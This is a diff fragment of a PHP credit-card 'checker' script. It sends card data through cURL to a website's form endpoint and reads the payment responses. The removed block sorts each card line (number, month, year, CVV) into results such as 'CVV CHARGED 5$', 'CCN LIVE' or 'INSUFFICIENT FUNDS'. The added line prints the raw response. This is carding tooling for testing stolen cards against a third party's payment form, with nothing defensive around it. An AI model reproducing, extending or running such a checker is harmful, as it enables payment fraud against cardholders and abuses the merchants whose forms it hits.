@@ -169,37 +169,7 @@ curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D81%26_f
 $result2 = curl_exec($ch);
 sleep(5);
 
-////////////////////////////===[Responses CVV]===////////////////////////////
-
-if
-(strpos($result2,  'Thank you for your message.')) {
-  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 5$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
-}
-
-elseif
-(strpos($result2,  'security code is incorrect')) {
-  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
-}
-
-elseif
-(strpos($result2,  'security code is invalid')) {
-  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
-}
-
-elseif
-(strpos($result2,  'insufficient funds')) {
-  echo "<font size=2 color='red'>  <font class='badge badge-dark'>✅ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Power Bysanji ⚡ </i></font><br>";
-}
-
-else {
-  echo "<font size=2 color='red'>  <font class='badge badge-danger'>❌ $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>Result: GENERIC DECLINED ❌ </i></font><br>";
-}
-
-curl_close($ch);
-ob_flush();
-sleep(5);
-
 //echo $result1;
-//echo $result2;
+echo $result2;
 ////////////////////////////===RAW BY HARIS===////////////////////////////
 ?>
